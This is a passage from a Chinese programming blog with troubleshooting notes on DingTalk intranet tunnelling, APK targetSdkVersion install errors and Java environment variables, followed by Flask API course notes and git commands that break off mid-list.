  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-common/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-common/" class="post-title-link" itemprop="url">疑难解答-common</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-04 14:17:46" itemprop="dateModified" datetime="2022-06-04T14:17:46+08:00">2022-06-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/troubleshooting/" itemprop="url" rel="index"><span itemprop="name">troubleshooting</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内网穿透之HTTP穿透"><a href="#内网穿透之HTTP穿透" class="headerlink" title="内网穿透之HTTP穿透"></a>内网穿透之HTTP穿透</h1><p><strong>注意</strong></p>
<ul>
<li>本工具不保证稳定性，仅适用于开发测试阶段，禁止当作公网。如线上应用使用本工具造成稳定性问题，由开发者承担负责。如果使用本工具传播违法不良信息，钉钉将追究法律责任。</li>
<li>线上环境使用请开通企业版，内容请参考<a target="_blank" rel="noopener" href="https://open.dingtalk.com/abilities/138">内网应用安全上钉钉</a>。</li>
</ul>
<h2 id="内网穿透示意图"><a href="#内网穿透示意图" class="headerlink" title="内网穿透示意图"></a>内网穿透示意图</h2><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/9904269951/p163821.png" alt="内网穿透"></p>
<h2 id="启动内网穿透"><a href="#启动内网穿透" class="headerlink" title="启动内网穿透"></a>启动内网穿透</h2><p>你可以使用以下两种方式启动内网穿透。</p>
<h3 id="使用DingTalk-Design-CLI启动内网穿透"><a href="#使用DingTalk-Design-CLI启动内网穿透" class="headerlink" title="使用DingTalk Design CLI启动内网穿透"></a>使用DingTalk Design CLI启动内网穿透</h3><ol>
<li><p>执行以下命令，下载DingTalk Design CLI工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install dingtalk-design-cli@latest -g</span><br></pre></td></tr></table></figure></li>
<li><p>执行以下命令，检测是否成功安装。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ding -v</span><br></pre></td></tr></table></figure></li>
<li><p>执行以下命令，启动钉钉内网穿透。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ding ngrok --subdomain dingabcde --port 8080</span><br></pre></td></tr></table></figure>

<p>执行完该命令后，你访问<code>http://dingabcde.vaiwan.cn/xxxxx</code>都会映射到<code>http://127.0.0.1:8080/xxxxx</code>。</p>
<p>关于DingTalk Design CLI更详细介绍请参考<a target="_blank" rel="noopener" href="https://open.dingtalk.com/document/resourcedownload/introduction">DingTalk Design CLI简介</a>。</p>
</li>
</ol>
<h3 id="从GitHub下载内网穿透工具"><a href="#从GitHub下载内网穿透工具" class="headerlink" title="从GitHub下载内网穿透工具"></a>从GitHub下载内网穿透工具</h3><ol>
<li><p>执行以下git命令，下载内网穿透工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/open-dingtalk/dingtalk-pierced-client.git </span><br></pre></td></tr></table></figure></li>
<li><p>执行以下命令，启动工具。</p>
<ul>
<li><p>Windows执行以下命令：</p>
<p><strong>说明</strong> </p>
<p>Windows需使用cmd工具打开命令行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd windows_64</span><br><span class="line">ding -config=ding.cfg -subdomain=abc 8080</span><br></pre></td></tr></table></figure></li>
<li><p>MAC执行以下命令：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd mac</span><br><span class="line">chmod <span class="number">777</span> ./ding</span><br><span class="line">./ding -config=./ding.<span class="property">cfg</span> -subdomain=abc <span class="number">8080</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>启动后界面如下图所示：</p>
<p>启动完客户端后，你访问<code>http://abc.vaiwan.``cn``/xxxxx</code>都会映射到<code>http://127.0.0.1:8080/xxxxx</code>。</p>
</li>
</ol>
<p><strong>参数说明：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-config</td>
<td>内网穿透的配置文件，按照命令示例固定为钉钉提供的./ding.cfg，无需修改</td>
</tr>
<tr>
<td>-subdomain</td>
<td>您需要使用的域名前缀，该前缀将会匹配到“vaiwan.cn”前面，例如你的subdomain是abcde，启动工具后会将abc.vaiwan.cn映射到本地。</td>
</tr>
<tr>
<td>端口</td>
<td>您需要代理的本地服务http-server端口，例如你本地端口为8080等</td>
</tr>
</tbody></table>
<p><strong>注意</strong></p>
<ul>
<li>若出现<a href="http://abc.vaiwan.cn:8082则表示subdomain参数被占用。">http://abc.vaiwan.cn:8082则表示subdomain参数被占用。</a></li>
<li>需要访问的域名是<a target="_blank" rel="noopener" href="http://abc.vaiwan.cn/xxxxx">http://abc.vaiwan.cn/xxxxx</a> 而不是<a target="_blank" rel="noopener" href="http://abc.vaiwan.cn:8080/xxxxx">http://abc.vaiwan.cn:8080/xxxxx</a></li>
<li>启动命令的subdomain参数有可能被别人占用，尽量不要用常用字符，可以用自己公司名的拼音，例如：alibaba、dingding等。</li>
<li>可以在本地起个http-server服务，放置一个index.html文件，然后访问<a target="_blank" rel="noopener" href="http://abc.vaiwan.cn/index.html%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E3%80%82">http://abc.vaiwan.cn/index.html测试一下。</a></li>
</ul>
<h1 id="AppNinja一文解决-targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具"><a href="#AppNinja一文解决-targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具" class="headerlink" title="AppNinja一文解决:targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具"></a>AppNinja一文解决:targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具</h1><p> 解决targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法</p>
<p>直接上解决办法：</p>
<p> 一、打包错误 AndroidManifest.xml:1: error: No resource identifier found for attribute ‘compileSdkVersionCodename’ in package ‘android’</p>
<p>解决方法：在AndroidManifest.xml中删除’compileSdkVersionCodename相关的。</p>
<p>二、安装错误 adb install -r SystemActivities.apk Performing Streamed Install adb: failed to install SystemActivities.apk: Failure [INSTALL_FAILED_OLDER_SDK: Failed parse during installPackageLI: /data/app/vmdl1716187195.tmp/base.apk (at Binary XML file line #0): Requires newer sdk version #28 (current version is #27)]</p>
<p>解决方法： 用apkide打开后，找到 apktool.yml文件，将其中的sdk版本号降级</p>
<p>详细说明：</p>
<p>为了让应用程序指定可以运行的版本，Android的manifest文件中提供了<uses-sdk>标签。该标签中有三个属性，分别是minSdkVersion，targetSdkVersion，maxSdkVersion。</p>
<p>Android:minSdkVersion —— 此属性决定你的应用能兼容的最低的系统版本，一盘情况是必须设置此属性。</p>
<p>android:targetSdkVersion —— 此属性说明你当前的应用是针对某一个系统版本开发设计的，也就是说在这个系统版本上运行是没有任何问题的。对于手机或其他终端设备会根据此属性值，决定是否显示一些特性和效果。当然对于开发者最直接的影响就是，你所用到的API都是基于此版本上的，高于此targetSdkVersion的API在使用的时候会有警告或者错误提示。</p>
<p>android:maxSdkVersion —— 此属性是决定你的应用能支持的版本最高是多少，超过此版本的系统将不能使用你的应用。</p>
<p>APK打包的时候经常碰到类似 targetSdkVersion 版本的问题.</p>
<p>一、APKIDE APK打包编译错误</p>
<p>正在编译Apk… </p>
<ul>
<li>失败：<br>W: AndroidManifest.xml:1: error: No resource identifier found for attribute ‘compileSdkVersion’ in package ‘android’<br>W: AndroidManifest.xml:1: error: No resource identifier found for attribute ‘compileSdkVersionCodename’ in package ‘android’</li>
</ul>
<p>解决方法：在AndroidManifest.xml中删除’compileSdkVersionCodename相关的。</p>
<p>二、安装错误</p>
<p>adb install -r SystemActivities.apk<br>Performing Streamed Install<br>adb: failed to install SystemActivities.apk: Failure [INSTALL_FAILED_OLDER_SDK: Failed parse during installPackageLI: /data/app/vmdl1716187195.tmp/base.apk (at Binary XML file line #0): Requires newer sdk version #28 (current version is #27)]</p>
<p>解决方法：<br>用apkide打开后，找到 apktool.yml文件，将其中的sdk版本号降级：</p>
<p>sdkInfo:<br>  minSdkVersion: ‘27’<br>  targetSdkVersion: ‘27’</p>
<p>如果编译失败，则删除掉 AndroidManifest.xml 中的 sdkversion版本号 。</p>
<h1 id="java环境变量-的配置与详解（全网最详细教程）"><a href="#java环境变量-的配置与详解（全网最详细教程）" class="headerlink" title="java环境变量 的配置与详解（全网最详细教程）"></a>java环境变量 的配置与详解（全网最详细教程）</h1><p>安装教程</p>
<p> JDK的下载与安装<br>首先，百度直接搜索JDK，然后打开Oracle的jdk下载网页。（如果你比较懒 ，下方为链接）</p>
<p><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p>
<p>接下来别忘记选择接受协议，然后打开系统设置面板检查所用电脑的系统位数。（64位 or 32位）</p>
<p><img src="https://img-blog.csdn.net/20180911093003588?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>如果为32位选择绿色剪头，如果为64位选择红色箭头。（如果是苹果电脑，请自行选择Mac选项）</p>
<p><img src="https://img-blog.csdn.net/20180911083814475?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>下载完成后打开安装包，点击下一步直到下图步骤。</p>
<p><img src="https://img-blog.csdn.net/20180113024101426?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvanpwMTA4MzQ2MjE1NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p>
<p>笔者推荐类似这种 语言的运行环境 装在C盘，如果C盘空间不足，或者比较介意请点击更改，选择你想要的路径（建议放在一个新建的空文件夹中）</p>
<p>（此处为盗图，因为笔者的电脑都已经装了两套环境了，所以没有再次安装）</p>
<p>注意：这个路径要记住，后面步骤要用到。</p>
<p>然后继续点击下一步，直到下图步骤。（盗图）</p>
<p><img src="https://img-blog.csdn.net/20180113024535783?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvanpwMTA4MzQ2MjE1NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p>
<p>这里，如果上一步更改路径了，选择更改（注意：要和上一个保存在同一目录下）如果上一步没有更改，点击下一步。</p>
<p>可能这里有人问，刚才不是选择过安装路径了吗？现在怎么又要选择？</p>
<p>这里解释一下，可能细心的朋友已经发现了刚才选择路径时，默认路径是：C:\Porgram File\Java\jdk1.8.0_181</p>
<p>这里的默认路径是：C:\Porgram File\Java\jre1.8.0_181</p>
<p>也就是说刚才安装的是JDK(开发)，现在安装的是JRE(运行)，路径建议是将这两个安装到同一个目录下。也就是说，如果第一个路径选择的是：X:\aaa\bbb\jdk1.8.0_181</p>
<p>第二个安装路径最好是：X:\aaa\bbb\jre1.8.0_181 这是为了便于环境变量值的书写方便。</p>
<p>接下来点击下一步直到最后完成安装（盗图）</p>
<p><img src="https://img-blog.csdn.net/20180113035037611?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvanpwMTA4MzQ2MjE1NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p>
<p> 配置java环境变量<br>打开系统设置，点击高级程序设置</p>
<p><img src="https://img-blog.csdn.net/20180911090451957?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>然后点击环境变量</p>
<p><img src="https://img-blog.csdn.net/20180911090553523?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>打开环境变量界面以后 点击下方的新建（注意：下方系统变量的新建按钮）</p>
<p><img src="https://img-blog.csdn.net/20180911090637852?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>JAVA_HOME变量<br>新建JAVA_HOME变量（下方可复制）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180911090929476?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>点击浏览目录，找到你刚才安装时第一次更改的路径（未修改的默认路径为  C:\Program Files\Java\jdk1.8.0_181 ）</p>
<p>(我的安装比较早，所以图片上显示的是jdk1.8.0_161)</p>
<p>然后点击确定。（注意：点击确定以后要检查一下，确保这个变量配置好了）</p>
<p>Path变量<br>找到系统变量中的path变量，选中，点击编辑</p>
<p><img src="https://img-blog.csdn.net/20180911103432658?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>然后点击新建（下方可复制，此处跟前面路径无关）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\bin</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180911091220612?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>继续点击新建，为了确保jre（运行）在你使用javaIDE的时候不产生问题，再新建一个变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure>


<p>再次注意：必须全是英文状态下的字符。</p>
<p>点击确定，然后确定。打开path变量确认一下是否已经成功保存变量。</p>
<p>ClassPath变量<br>方法和java-home一样，在初始界面点击新建（下方可复制）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassPath</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; </span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180911111158980?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>点击确认，然后 关闭，重新打开，确认一下是否已经成功安装。</p>
<p>备注：目前笔者在查找比较确切的classpath变量环境的配置值。（网络上有各种版本）本文所用的配置值的依据底下有解释</p>
<p>至此，大家一致认为的Java环境变量就配置完成了。你看懂了吗？</p>
<p>classpath变量配置的解释<br>打开我的电脑中JDK的目录，找到以下文件；</p>
<p><img src="https://img-blog.csdn.net/20180911091701163?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20180911091906430?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>打开classpath变量所写的文件目录，发现如下文件。</p>
<p><img src="https://img-blog.csdn.net/20180911091821782?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>编辑，新建到系统变量的一系列值，其实，也就相当于告诉你的电脑，你新安装的某种编程语言运行环境在这里，你通过这里的配置把你的电脑引导到所需文件夹下。JAVA语言运行需要通过虚拟机，所以配置环境变量是为了JAVA文件运行时，引导它到你指定的文件夹运行虚拟机。</p>
<p>所以，我的java环境classpath变量的配置值是正确的！</p>
<p>java运行环境的验证<br>敲击键盘的Windows + R 按键，打开运行提示框，输入cmd（command简写，打开“小黑框”）</p>
<p><img src="https://img-blog.csdn.net/20180911115106941?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20180911115248755?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>输入java，验证java安装是否成功。</p>
<p><img src="https://img-blog.csdn.net/20180911115340923?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p><img src="https://img-blog.csdn.net/20180911115404425?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>输入javac</p>
<p><img src="https://img-blog.csdn.net/20180911115450622?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>点击回车 </p>
<p><img src="https://img-blog.csdn.net/20181003175715407?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDM2MTIy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>验证完毕！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/python-web-flask-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/python-web-flask-2/" class="post-title-link" itemprop="url">python-web-flask-2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-22 15:53:48" itemprop="dateModified" datetime="2022-06-22T15:53:48+08:00">2022-06-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="WEB应用开发-Flask第六天"><a href="#WEB应用开发-Flask第六天" class="headerlink" title="WEB应用开发-Flask第六天"></a>WEB应用开发-Flask第六天</h1><h2 id="一、Flask的技术点复习"><a href="#一、Flask的技术点复习" class="headerlink" title="一、Flask的技术点复习"></a>一、Flask的技术点复习</h2><ul>
<li><p>请求与响应</p>
</li>
<li><p>flask依赖的三个基本库</p>
</li>
<li><p>flask项目的拆分：更好地体现mvc/mtv的设计思想，易于扩展和维护。</p>
</li>
<li><p>flask应用对象中属性的配置config</p>
</li>
<li><p>路由规则</p>
</li>
<li><p>视图处理</p>
<ul>
<li>request对象中的属性<code>(url, base_url, host_url, path, status_code, remote_addr)</code></li>
<li>request对象中的字典属性<code>(args, form, cookies, headers, files)</code></li>
<li>request对象中的获上传json数据的方法：request_get_json()</li>
<li>生成响应对象<ul>
<li>make_response(data, code)</li>
<li>Response(data, code)</li>
<li>jsonify(dict | list)</li>
<li>redirect(path | url_for())重定向</li>
</ul>
</li>
</ul>
</li>
<li><p>模板技术</p>
<ul>
<li>模板文件的位置templates（一定和创建flask()对象所在python脚本同一级目录）</li>
<li>模板文件即是html文件，只不过html文件中使用变量<code>&#123;&#123;  &#125;&#125;</code> 或语句格式<code>&#123;%  %&#125;</code></li>
<li>模板结构语句块<code>&#123;% block %&#125;</code>、<code>&#123;% extends %&#125;</code>、<code>&#123;% include %&#125;</code>、<code>&#123;% macro %&#125;</code></li>
<li>模板中的分支与循环语句<code>&#123;% if %&#125;</code>、<code>&#123;% else %&#125;</code>、<code>&#123;% elif %&#125;</code>、<code>&#123;% for %&#125; / &#123;&#123;loop&#125;&#125;</code></li>
<li>模板过滤器：字符类型、格式化、列表、对象，自定义@app.template_filter(‘’)</li>
</ul>
</li>
<li><p>数据模型sqlalchemy</p>
<ul>
<li><p>数据类型：String, integer, float, date, datetime, text, boolean, enum(‘枚举’)</p>
</li>
<li><p>约束：primary_key, unique, nullable, default, server_default, autoincrement, ForeignKey</p>
</li>
<li><p>模型类db.Model</p>
</li>
<li><p>字段类：db.Column()</p>
</li>
<li><p>模型字段的反向引用</p>
<p>db.relationship(引用的类, backref=’引用类中新增属性’)</p>
</li>
<li><p>模型的多对多关系：使用第三个模型或第三个表db.Table</p>
<img src="apiserver/%E5%A4%9A%E5%AF%B9%E5%A4%9A%E5%85%B3%E7%B3%BB%E7%9A%84%E6%A8%A1%E5%9E%8B.png" alt="多对多关系的模型" style="zoom:80%;" /></li>
<li><p>模型的CURD：</p>
<ul>
<li>db.session.query(类或字段).filter(条件)</li>
<li>模型类.query.filter(条件) | all() | one()</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="二、Flask实现api接口开发"><a href="#二、Flask实现api接口开发" class="headerlink" title="二、Flask实现api接口开发"></a>二、Flask实现api接口开发</h2><ol>
<li><p>创建环境（运行环境：1-virtualenv，2-conda）</p>
<p>环境创建成功之后，需要安装相关的库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">   pip install Flask==<span class="number">2.1</span><span class="number">.2</span></span><br><span class="line">   flask-blueprint==<span class="number">1.3</span><span class="number">.0</span></span><br><span class="line">   Flask-Cors==<span class="number">3.0</span><span class="number">.10</span></span><br><span class="line">   Flask-Script==<span class="number">2.0</span><span class="number">.6</span></span><br><span class="line">   Flask-SQLAlchemy==<span class="number">2.5</span><span class="number">.1</span></span><br><span class="line">   PyMySQL==<span class="number">1.0</span><span class="number">.2</span></span><br><span class="line">   redis==<span class="number">2.10</span><span class="number">.6</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 解决跨域问题-Flask-CORS</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 选择数据库操作框架（自定义DAO+SQL、SQLAlchemy-ORM、基于元类自定义ORM）</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 拆分项目结构（app, dao, utils, manage.py）</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> 数据的交互json</span><br><span class="line"></span><br><span class="line">   - 前端上传json数据</span><br><span class="line">   - 后端接收json并解析，最后生成json的结果数据响应给客户端</span><br><span class="line"></span><br><span class="line">代码托管到github：https://github.com/disenQF/edu_api_v3</span><br><span class="line"></span><br><span class="line"><span class="comment">### git操作流程</span></span><br><span class="line"></span><br><span class="line">首先在github创建新的名为“edu_api_v3”仓库</span><br><span class="line"></span><br><span class="line">```git init```</span><br><span class="line"></span><br><span class="line">```txt</span><br><span class="line"><span class="comment"># 创建.gitignore文件并添加以下</span></span><br><span class="line">.idea</span><br><span class="line">__pycache__</span><br><span class="line">*.log*</span><br><span class="line">venv</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 创建readme.md文件并添加以下</span></span><br><span class="line"><span class="section"># LL 教育app接口服务</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 一、安装部署</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.1 git clone</span></span><br><span class="line"></span><br><span class="line">git clone https://github.com/Z1174185292W/edu<span class="emphasis">_api_</span>v3.git</span><br><span class="line"></span><br><span class="line"><span class="section">### 1.2 virtualenv 创建python3的环境</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.3 安装requirements.txt依赖库</span></span><br></pre></td></tr></table></figure>

<p><code>git add .</code></p>
<p><code>git status</code></p>
<p><code>git commit -m &#39;init_api_server&#39;</code></p>
<p><code>git log</code></p>
<p><code>git remote add origin git@github.com:Z1174185292W/edu_api_v3.git</code></p>
<p><code>git config -l</code></p>
<p><code>git push -u origin master</code></p>
<p><code>git clone git@github.com:Z1174185292W/edu_api_v3.git</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">开发者角色：</span><br><span class="line"></span><br><span class="line">- 主管（搭建项目架构，上传code到github）</span><br><span class="line"></span><br><span class="line">- 开发人员</span><br><span class="line"></span><br><span class="line">  - 第一次从github clone代码、</span><br><span class="line"></span><br><span class="line">  - 创建项目运行环境</span><br><span class="line"></span><br><span class="line">  - 